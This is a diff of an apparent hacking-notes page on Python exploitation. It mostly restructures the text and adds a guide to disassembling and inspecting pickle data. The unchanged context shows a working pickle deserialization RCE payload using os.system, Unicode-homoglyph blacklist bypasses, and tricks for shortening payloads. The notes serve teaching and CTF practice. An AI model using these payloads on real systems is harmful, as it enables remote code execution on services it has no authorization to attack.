@@ -393,7 +393,7 @@ print(obfuscate('open("flag").read()'))  # 𝘰𝘱𝘦𝘯("flag").𝘳𝘦𝘢
 ```
 
 {% hint style="info" %}
-If a **shorter** payload (less bytes) is needed, you can mix-and-match these unicode characters in your payload. These unicode characters take up 4 bytes each, but you will likely **only need one** in your blacklisted word to bypass it, only requiring the penalty once. For example (only the first character encoded):
+If a **shorter** payload (fewer bytes) is needed, you can mix and match these unicode characters in your payload. These unicode characters take up 4 bytes each, but you will likely **only need one** in your blacklisted word to bypass it, only requiring the penalty once. For example (only the first character encoded):
 
 ```python
 𝘰pen("flag").𝘳ead()
@@ -455,7 +455,7 @@ class RCE:
     def __reduce__(self):
         import os
         return (os.system, ("id",))
-        
+
 rce = RCE()
 data = pickle.dumps(rce)
 print(data) # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
@@ -463,9 +463,11 @@ print(data) # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8
 
 This method is called when the object is deserialized, and its return value will be what it turns into. But this return value is actually a function that will be called with the arguments provided. We can provide the function `os.system` after importing it, and as the first argument give it any command we want to run.&#x20;
 
-This is often enough, but in rare cases, you might have some restrictions on what data you can send. Maybe you need to bypass some filter or a length restriction.&#x20;
+### Minimizing Payloads
 
-### Different Protocols
+The above is often enough, but in rare cases, you might have some restrictions on what data you can send. Maybe you need to bypass some filter or a length restriction.&#x20;
+
+#### Different Protocols
 
 Pickle has evolved over time, with new protocols for better serializing of objects. Luckily, this protocol can be chosen by whoever creates the data, and the server deserializing it will simply recognize the protocol and switch accordingly.&#x20;
 
@@ -513,9 +515,9 @@ len(data)=34                       len(data)=33                        len(data)
                                                                                                                                                len(data)=40
 ```
 
-I found in most simple cases, `protocol=1` is the shortest.&#x20;
+In most simple cases, `protocol=1` is the shortest.&#x20;
 
-### Replacing strings
+#### Replacing strings
 
 As you might have noticed above, the `os.system` function turned into `'posix system'` for serialized data. This is what automatically happens when you serialize data using `pickle.dumps`, but it turns out there are actually multiple ways to represent this function.&#x20;
 
@@ -528,11 +530,93 @@ data = data.replace(b"posix", b"os")
 print(data)  # b'\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00\x8c\x05os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
 ```
 
-### Short commands
+#### Short commands
 
-Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In the writeup linked above, I discover my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;
+Finally, after having the shortest possible pickle data, you need a short command to receive a shell and further explore the target. In [the writeup](https://jorianwoltjer.com/blog/post/hacking/getting-rce-on-a-brute-forcing-assignment#bash-tricks) linked above, I discover my own method to slowly write a full payload to a file and execute it in a lot of commands below 12 bytes. This was enough to bypass the 40-byte packet limit that the situation had.&#x20;
 
-However, in the meantime, I found that this problem has been explored before. Orange Tsai made a challenge where you had to achieve full RCE commands of only 4 bytes each. The solution to this challenge is explained in [#rce-in-4-bytes](../linux/hacking-linux-boxes.md#rce-in-4-bytes "mention").&#x20;
+However, in the meantime, I found that this problem has been explored before. Orange Tsai made a challenge where you had to achieve full RCE commands of only 4 bytes each. The solution to this challenge is explained in [#rce-in-4-bytes](../linux/hacking-linux-boxes.md#rce-in-4-bytes "mention"). This can be applied just as easily to this injection.&#x20;
+
+### Reverse Engineering
+
+You might find a serialized piece of pickle data, but without source code, it may be difficult to understand what it exactly means. There are a few **plaintext strings** inside the serialized data that can give an idea of what it is about. To get a full understanding of everything some more analysis is required, but luckily there exist tools that help with this.&#x20;
+
+#### Static Analysis
+
+The [`pickletools`](https://docs.python.org/3/library/pickletools.html) library contains useful functions for analyzing pickled data and can disassemble the opcodes to get a better understanding of the binary data:
+
+{% code title="Source" %}
+```python
+with open('something.pkl', 'wb') as f:
+    pickle.dump((1, 2), f)  # Pickle of (1, 2) tuple
+```
+{% endcode %}
+
+<pre class="language-shell-session" data-title="CLI Disassembly"><code class="lang-shell-session"><strong>$ python3 -m pickletools something.pkl -a
+</strong>    0: \x80 PROTO      4              Protocol version indicator.
+    2: \x95 FRAME      7              Indicate the beginning of a new frame.
+   11: K    BININT1    1              Push a one-byte unsigned integer.
+   13: K    BININT1    2              Push a one-byte unsigned integer.
+   15: \x86 TUPLE2                    Build a two-tuple out of the top two items on the stack.
+   16: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
+   17: .    STOP                      Stop the unpickling machine.
+highest protocol among opcodes = 4
+</code></pre>
+
+{% code title="From Python" %}
+```python
+with open('something.pkl', 'rb') as f:
+    pickletools.dis(f)  # Disassemble and print to STDOUT
+```
+{% endcode %}
+
+This disassembly works with pushing and popping from the **stack**. This is more clear with a nested expression like `(1, [2, 3])`:
+
+```
+11: K    BININT1    1              Push a one-byte unsigned integer.
+13: ]    EMPTY_LIST                Push an empty list.
+14: \x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.
+15: (    MARK                      Push markobject onto the stack.
+16: K        BININT1    2          Push a one-byte unsigned integer.
+18: K        BININT1    3          Push a one-byte unsigned integer.
+20: e        APPENDS    (MARK at 15) Extend a list by a slice of stack objects.
+21: \x86 TUPLE2                      Build a two-tuple out of the top two items on the stack.
+22: \x94 MEMOIZE    (as 1)           Store the stack top into the memo.  The stack is not popped.
+```
+
+Here, a `1` integer is pushed on the stack, then an empty list is pushed too. The numbers `2` and `3` are added to a "markobject" and at the end the list is extended by this slice. This leaves the integer `1` and the list on the top of the stack, which is turned into a tuple from the 2 topmost stack items using `TUPLE2`.&#x20;
+
+A common opcode is `MEMOIZE`, which stores the stack top in a special place for reuse later on. These can then be referenced further in the data so it does not have to be repeated.&#x20;
+
+#### Dynamic Analysis
+
+{% hint style="warning" %}
+**Warning**: As shown above, deserializing _any_ pickle payload can lead to Arbitrary Code Execution, so be careful what you deserialize while reverse engineering! If you have any reason for suspicion, try it in a safe environment like a VM first.
+{% endhint %}
+
+While static analysis can give a decent idea, you can see a lot quickly when simply running the code in the pickled data. To get only the result of a deserialization, run:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 -m pickle x.pickle
+</strong>(1, 2)
+</code></pre>
+
+You can play with the result if it is more complex in a Python console:
+
+<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong>>>> import pickle
+</strong><strong>>>> p = pickle.load(open("something.pkl", "rb"))
+</strong>(1, 2)
+<strong>>>> p[1]
+</strong>2
+<strong>>>> dir(p)
+</strong>['__add__', '__class__', '__contains__', ..., '__subclasshook__', 'count', 'index']
+</code></pre>
+
+{% hint style="warning" %}
+Some pickled data requires custom classes to be defined, which it sets properties on or initializes in other ways. These need to be defined in the context before deserializing or it will throw an error with the missing class name. if these are unknown try doing more [#static-analysis](python.md#static-analysis "mention")
+{% endhint %}
+
+To view more of the steps involved, try following the `load()` call in a **debugger** like VSCode, which will decompile some pieces of code visually and show intermediate variables. If a pickle object requires more steps to be created, this can give a great idea of those steps.
+
+If you find your mystery object has **functions** defined (common with machine learning models), the [`inspect.getsource()`](https://docs.python.org/3/library/inspect.html#inspect.getsource) function may be able to recreate the source code for the function in question. The more low-level [`dis.dis()`](https://docs.python.org/3/library/dis.html#dis.dis) function can give you disassembled bytecode instead.
 
 ## Werkzeug - Debug Mode RCE (Console PIN)
 
